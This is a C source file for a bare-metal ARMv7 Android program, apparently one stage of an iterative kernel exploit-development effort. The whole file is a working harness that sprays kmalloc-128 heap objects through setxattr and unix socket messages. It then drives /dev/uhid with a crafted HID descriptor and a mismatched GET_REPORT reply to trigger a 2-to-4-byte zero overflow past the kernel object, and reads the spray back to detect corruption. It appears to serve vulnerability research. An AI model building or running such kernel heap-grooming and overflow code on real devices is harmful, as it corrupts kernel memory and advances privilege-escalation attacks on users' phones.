/*
 * uhid_groom.c -- Phase 14 Round 22: combined spray + UHID zero-overflow harness.
 *
 * Bare-metal armv7a static ELF (no libc, raw svc 0).  SAFETY: the large feature
 * report length L is validated to be exactly 129, 130 or 131
 * (=> 2/3/4 zero bytes past the 128-byte kmalloc object).  NEVER larger.
 *
 * Corrected arm64 math (confirmed via /proc/slabinfo: minimum bucket kmalloc-128):
 *   mt_get_feature(report3): buf = kzalloc(hid_report_len(r3)+7)=kzalloc(9)
 *       -> kmalloc-128 object (128 usable bytes).
 *   hid_report_raw_event(size=2): numbered -> cdata=buf+1,csize=1;
 *       reply data[0]=4 selects report 4 (L data bytes);
 *       memset(cdata+csize,0,L-1)=memset(buf+2,0,L-1), last byte at buf+L.
 *   OOB past the 128-byte object = L-127  (129->2,130->3,131->4).
 *
 * ARM 32-bit syscall numbers (v5.4 arch/arm/tools/syscall.tbl):
 *   exit=1 read=3 write=4 close=6 unlink=10 getpid=20 poll=168
 *   setxattr=226 getxattr=229 removexattr=235 openat=322
 *   socketpair=288 sendmsg=296 recvmsg=297
 *
 * Build:
 *   clang --target=armv7a-linux-androideabi21 -nostdlib -static -Os \
 *         -o uhid_groom uhid_groom.c
 * Usage: uhid_groom <L:129|130|131> [xattr-file]
 */
#define __NR_exit       1
#define __NR_read       3
#define __NR_write      4
#define __NR_close      6
#define __NR_getpid    20
#define __NR_poll     168
#define __NR_setxattr 226
#define __NR_getxattr 229
#define __NR_removexattr 235
#define __NR_socketpair 288
#define __NR_sendmsg  296
#define __NR_recvmsg  297
#define __NR_openat   322

#define AT_FDCWD (-100)
#define O_RDWR   2
#define O_CREAT  0100
#define O_TRUNC  01000
#define O_WRONLY 1
#define POLLIN   1
#define AF_UNIX  1
#define SOCK_DGRAM 2

typedef unsigned char u8;
typedef unsigned short u16;
typedef unsigned int u32;
typedef unsigned long long u64;

enum {
    UHID_DESTROY=1, UHID_START=2, UHID_STOP=3, UHID_OPEN=4, UHID_CLOSE=5,
    UHID_OUTPUT=6, UHID_GET_REPORT=9, UHID_GET_REPORT_REPLY=10,
    UHID_CREATE2=11, UHID_INPUT2=12, UHID_SET_REPORT=13, UHID_SET_REPORT_REPLY=14,
};
struct uhid_start_req { u64 dev_flags; } __attribute__((packed));
struct uhid_create2_req {
    u8 name[128]; u8 phys[64]; u8 uniq[64];
    u16 rd_size; u16 bus; u32 vendor; u32 product; u32 version; u32 country;
    u8 rd_data[4096];
} __attribute__((packed));
struct uhid_get_report_req { u32 id; u8 rnum; u8 rtype; } __attribute__((packed));
struct uhid_get_report_reply_req {
    u32 id; u16 err; u16 size; u8 data[4096];
} __attribute__((packed));
struct uhid_event {
    u32 type;
    union {
        struct uhid_create2_req create2;
        struct uhid_start_req start;
        struct uhid_get_report_req get_report;
        struct uhid_get_report_reply_req get_report_reply;
    } u;
} __attribute__((packed));
struct pollfd { int fd; short events; short revents; };
struct iovec { void*iov_base; u32 iov_len; };
struct msghdr {
    void*msg_name; u32 msg_namelen; struct iovec*msg_iov; u32 msg_iovlen;
    void*msg_control; u32 msg_controllen; int msg_flags;
};

/* ---- minimal EABI helpers ---- */
void __aeabi_memcpy(void*d,const void*s,unsigned n)
{volatile u8*x=d;volatile const u8*y=s;while(n--)*x++=*y++;}
void __aeabi_memmove(void*d,const void*s,unsigned n){__aeabi_memcpy(d,s,n);}
void __aeabi_memset(void*d,int c,unsigned n){volatile u8*x=d;while(n--)*x++=(u8)c;}
void __aeabi_memclr(void*d,unsigned n){__aeabi_memset(d,0,n);}

static void zero_(void*p,unsigned n){volatile u8*q=p;while(n--)*q++=0;}
static int slen_(const char*s){volatile const char*p=s;int n=0;while(*p){p++;n++;}return n;}
static long sys1(long n,long a)
{register long r0 asm("r0")=a,r7 asm("r7")=n;asm volatile("svc 0":"+r"(r0):"r"(r7):"memory");return r0;}
static long sys3(long n,long a,long b,long c)
{register long r0 asm("r0")=a,r1 asm("r1")=b,r2 asm("r2")=c,r7 asm("r7")=n;asm volatile("svc 0":"+r"(r0):"r"(r1),"r"(r2),"r"(r7):"memory");return r0;}
static long sys4(long n,long a,long b,long c,long d)
{register long r0 asm("r0")=a,r1 asm("r1")=b,r2 asm("r2")=c,r3 asm("r3")=d,r7 asm("r7")=n;asm volatile("svc 0":"+r"(r0):"r"(r1),"r"(r2),"r"(r3),"r"(r7):"memory");return r0;}
static long sys5(long n,long a,long b,long c,long d,long e)
{register long r0 asm("r0")=a,r1 asm("r1")=b,r2 asm("r2")=c,r3 asm("r3")=d,r4 asm("r4")=e,r7 asm("r7")=n;asm volatile("svc 0":"+r"(r0):"r"(r1),"r"(r2),"r"(r3),"r"(r4),"r"(r7):"memory");return r0;}
static void puts_(const char*s){sys3(__NR_write,1,(long)s,slen_(s));}
static void putint(long v)
{char b[24];int i=0,neg=0;if(v<0){neg=1;v=-v;}if(!v)b[i++]='0';while(v>0){b[i++]='0'+(v%10);v/=10;}
 if(neg)sys3(__NR_write,1,(long)"-",1);for(int j=i-1;j>=0;j--){char c=b[j];sys3(__NR_write,1,(long)&c,1);}}
static int eq_(const char*a,const char*b)
{volatile const char*x=a,*y=b;while(*x&&*y){if(*x!=*y)return 0;x++;y++;}return *x==*y;}
static unsigned parse_u(const char*s){unsigned v=0;while(*s>='0'&&*s<='9'){v=v*10+(unsigned)(*s-'0');s++;}return v;}

/* descriptor assembled at runtime: report 4 Report Count = L */
static u8 rd[160];
static int rd_len;
static void build_rd(u8 L)
{
    u8*p=rd;
    /* Digitizer / Touch Screen application collection */
    *p++=0x05;*p++=0x0D;*p++=0x09;*p++=0x04;*p++=0xA1;*p++=0x01;
    /* Input report ID 1: ContactID/X/Y -> HID_GROUP_MULTITOUCH */
    *p++=0x85;*p++=0x01;*p++=0x09;*p++=0x22;*p++=0xA1;*p++=0x02;*p++=0x09;*p++=0x51;
    *p++=0x09;*p++=0x30;*p++=0x09;*p++=0x31;*p++=0x15;*p++=0x00;*p++=0x26;*p++=0xFF;
    *p++=0x00;*p++=0x75;*p++=0x08;*p++=0x95;*p++=0x03;*p++=0x81;*p++=0x02;*p++=0xC0;
    /* FEATURE report ID 3: HID_DG_CONTACTMAX (1 byte) -> probe GET_REPORT */
    *p++=0x85;*p++=0x03;*p++=0x09;*p++=0x55;*p++=0x15;*p++=0x00;*p++=0x26;*p++=0xFF;
    *p++=0x00;*p++=0x75;*p++=0x08;*p++=0x95;*p++=0x01;*p++=0xB1;*p++=0x02;
    /* FEATURE report ID 4: L-byte vendor blob (the oversized report) */
    *p++=0x85;*p++=0x04;*p++=0x06;*p++=0x00;*p++=0xFF;*p++=0x09;*p++=0x01;*p++=0x15;
    *p++=0x00;*p++=0x26;*p++=0xFF;*p++=0x00;*p++=0x75;*p++=0x08;*p++=0x95;*p++=L;
    *p++=0xB1;*p++=0x02;
    *p++=0xC0; /* End Collection */
    rd_len=(int)(p-rd);
}

/* ---------------- spray state ---------------- */
#define NSRAY 200
#define VSZ   120
static u8 canary[NSRAY][VSZ];       /* the values we wrote */
static u8 rdbuf[VSZ+8];
static char xname[NSRAY][24];
static int sp_fds[2];

/* value: byte0 = index tag (i+1), rest = pattern derived from index */
static void make_value(int i)
{
    canary[i][0]=(u8)(i+1);
    for(int j=1;j<VSZ;j++) canary[i][j]=(u8)(0x40 + ((j*7 + i*13)%90));
}
static int cmp_value(int i)
{
    int bad=0;
    for(int j=0;j<VSZ;j++) if(rdbuf[j]!=canary[i][j]) bad++;
    return bad;
}

static int spray_setxattr(const char*path)
{
    long fd=sys4(__NR_openat,AT_FDCWD,(long)path,O_WRONLY|O_CREAT|O_TRUNC,0644);
    if(fd<0){puts_("  spray open FAILED ");putint(fd);puts_("\n");return -1;}
    sys1(__NR_close,fd);
    int ok=0;
    for(int i=0;i<NSRAY;i++){
        make_value(i);
        xname[i][0]=0;
        /* build "user.r22NNN" */
        const char pre[]="user.r22";
        for(int k=0;pre[k];k++)xname[i][k]=pre[k];
        int p=8;
        int n=i;
        xname[i][p++]=(char)('0'+(n/100)%10);
        xname[i][p++]=(char)('0'+(n/10)%10);
        xname[i][p++]=(char)('0'+n%10);
        xname[i][p]=0;
        long r=sys5(__NR_setxattr,(long)path,(long)xname[i],(long)canary[i],VSZ,0);
        if(r==0)ok++;
    }
    puts_("  spray setxattr ok=");putint(ok);puts_("/");putint(NSRAY);puts_("\n");
    return ok;
}

static int spray_unix(void)
{
    if(sys4(__NR_socketpair,AF_UNIX,SOCK_DGRAM,0,(long)sp_fds)!=0){puts_("  socketpair FAILED\n");return -1;}
    int ok=0;
    for(int i=0;i<NSRAY;i++){
        make_value(i);
        struct iovec iov; iov.iov_base=canary[i]; iov.iov_len=VSZ;
        struct msghdr mh; zero_(&mh,sizeof(mh)); mh.msg_iov=&iov; mh.msg_iovlen=1;
        if(sys3(__NR_sendmsg,sp_fds[0],(long)&mh,0)==VSZ)ok++;
    }
    puts_("  spray unix sendmsg ok=");putint(ok);puts_("/");putint(NSRAY);puts_("\n");
    return ok;
}

static void verify_spray(const char*path)
{
    int xbad=0, ubad=0, xgot=0, ugot=0;
    for(int i=0;i<NSRAY;i++){
        zero_(rdbuf,sizeof(rdbuf));
        long r=sys4(__NR_getxattr,(long)path,(long)xname[i],(long)rdbuf,VSZ);
        if(r==VSZ){xgot++; if(cmp_value(i)){xbad++; if(xbad<=5){puts_("   XATTR idx=");putint(i);puts_(" first=");putint(rdbuf[0]);puts_(" want=");putint(canary[i][0]);puts_("\n");}}}
        zero_(rdbuf,sizeof(rdbuf));
        struct iovec iov; iov.iov_base=rdbuf; iov.iov_len=VSZ;
        struct msghdr mh; zero_(&mh,sizeof(mh)); mh.msg_iov=&iov; mh.msg_iovlen=1;
        r=sys3(__NR_recvmsg,sp_fds[1],(long)&mh,0);
        if(r==VSZ){ugot++; if(cmp_value(i)){ubad++; if(ubad<=5){puts_("   UNIX idx=");putint(i);puts_(" first=");putint(rdbuf[0]);puts_(" want=");putint(canary[i][0]);puts_("\n");}}}
    }
    puts_("  [verify] xattr got=");putint(xgot);puts_(" bad=");putint(xbad);
    puts_(" unix got=");putint(ugot);puts_(" bad=");putint(ubad);puts_("\n");
}

/* ---------------- UHID state ---------------- */
static int saw_getreport,saw_open,read_errors;
static void print_event(struct uhid_event*ev,long n)
{
    puts_("  EVENT type=");putint(ev->type);
    switch(ev->type){
    case UHID_START:puts_(" (START) flags=0x");break;
    case UHID_STOP:puts_(" (STOP)");break;
    case UHID_OPEN:puts_(" (OPEN)");break;
    case UHID_CLOSE:puts_(" (CLOSE)");break;
    case UHID_GET_REPORT:
        puts_(" (GET_REPORT) id=");putint(ev->u.get_report.id);
        puts_(" rnum=");putint(ev->u.get_report.rnum);
        puts_(" rtype=");putint(ev->u.get_report.rtype);break;
    default:puts_(" (other)");
    }
    puts_(" rawlen=");putint(n);puts_("\n");
}
static void handle(int fd,struct uhid_event*in)
{
    if(in->type!=UHID_GET_REPORT)return;
    saw_getreport=1;
    u32 id=in->u.get_report.id; u8 rnum=in->u.get_report.rnum;
    struct uhid_event out; zero_(&out,sizeof(out));
    out.type=UHID_GET_REPORT_REPLY;
    out.u.get_report_reply.id=id; out.u.get_report_reply.err=0;
    out.u.get_report_reply.size=2;
    /* MISMATCHED: select report 4 -> rsize=L > csize=1 -> memset spill */
    out.u.get_report_reply.data[0]=4; out.u.get_report_reply.data[1]=0;
    puts_("  >>> SPILL REPLY id=");putint(id);puts_(" rnum=");putint(rnum);
    puts_(" size=2 data[0]=4\n");
    puts_("  reply write ret=");putint(sys3(__NR_write,fd,(long)&out,sizeof(out)));puts_("\n");
}
static void pump(int fd,int rounds)
{
    for(int i=0;i<rounds;i++){
        struct pollfd p; p.fd=fd;p.events=POLLIN;p.revents=0;
        if(sys3(__NR_poll,(long)&p,1,300)<=0)continue;
        struct uhid_event ev; long n=sys3(__NR_read,fd,(long)&ev,sizeof(ev));
        if(n<=0){puts_("  READ ERROR ");putint(n);puts_("\n");read_errors++;return;}
        print_event(&ev,n);
        if(ev.type==UHID_OPEN)saw_open=1;
        if(ev.type==UHID_GET_REPORT||ev.type==UHID_SET_REPORT)handle(fd,&ev);
    }
}

__attribute__((naked)) void _start(void){__asm__ volatile("mov r0,sp\n\tb groom_main\n");}
void groom_main(unsigned long*stackp)
{
    int argc=(int)stackp[0]; char**argv=(char**)&stackp[1];
    puts_("=== Phase14 Round22: spray + UHID 2-4B spill ===\n");
    if(argc<2){puts_("usage: uhid_groom <L 129|130|131> [xattr-file]\n");sys3(__NR_exit,2,0,0);for(;;){}}
    unsigned L=parse_u(argv[1]);
    if(L!=129 && L!=130 && L!=131){puts_("L MUST be 129/130/131\n");sys3(__NR_exit,2,0,0);for(;;){}}
    const char*xpath=(argc>=3)?argv[2]:"/data/local/tmp/r22_groom_xattr";
    puts_("pid=");putint(sys1(__NR_getpid,0));puts_("\n");
    puts_("[cfg] L=");putint(L);puts_(" OOB=");putint((long)L-127);puts_(" bytes\n");

    /* --- spray --- */
    puts_("[spray] setxattr:\n"); spray_setxattr(xpath);
    puts_("[spray] unix dgram:\n"); spray_unix();

    /* --- UHID trigger --- */
    build_rd((u8)L);
    puts_("[cfg] rd_size=");putint(rd_len);puts_("\n");
    long fd=sys3(__NR_openat,AT_FDCWD,(long)"/dev/uhid",O_RDWR);
    puts_("open(/dev/uhid) fd=");putint(fd);puts_("\n");
    if(fd<0){sys3(__NR_exit,1,0,0);for(;;){}}
    struct uhid_event ev; zero_(&ev,sizeof(ev));
    ev.type=UHID_CREATE2;
    {const char*n="vhid-r22",*ph="uhid/r22",*uq="R22";
     volatile const char*p;
     for(p=n;*p;p++)ev.u.create2.name[(p-n)]=(u8)*p;
     for(p=ph;*p;p++)ev.u.create2.phys[(p-ph)]=(u8)*p;
     for(p=uq;*p;p++)ev.u.create2.uniq[(p-uq)]=(u8)*p;}
    ev.u.create2.rd_size=(u16)rd_len; ev.u.create2.bus=3;
    ev.u.create2.vendor=0x1234; ev.u.create2.product=0x5678;
    ev.u.create2.version=1; ev.u.create2.country=0;
    for(int i=0;i<rd_len;i++)ev.u.create2.rd_data[i]=rd[i];
    puts_("write(CREATE2) ret=");putint(sys3(__NR_write,fd,(long)&ev,sizeof(ev)));puts_("\n");
    pump(fd,16);
    struct uhid_event de; zero_(&de,sizeof(de)); de.type=UHID_DESTROY;
    puts_("write(DESTROY) ret=");putint(sys3(__NR_write,fd,(long)&de,sizeof(de)));puts_("\n");
    pump(fd,3);
    sys1(__NR_close,fd);

    /* --- readback --- */
    puts_("[readback]\n"); verify_spray(xpath);
    puts_("[result] saw_getreport=");putint(saw_getreport);
    puts_(" saw_open=");putint(saw_open);
    puts_(" read_errors=");putint(read_errors);puts_("\n");
    puts_("=== done ===\n");
    sys3(__NR_exit,0,0,0);
    for(;;){}
}
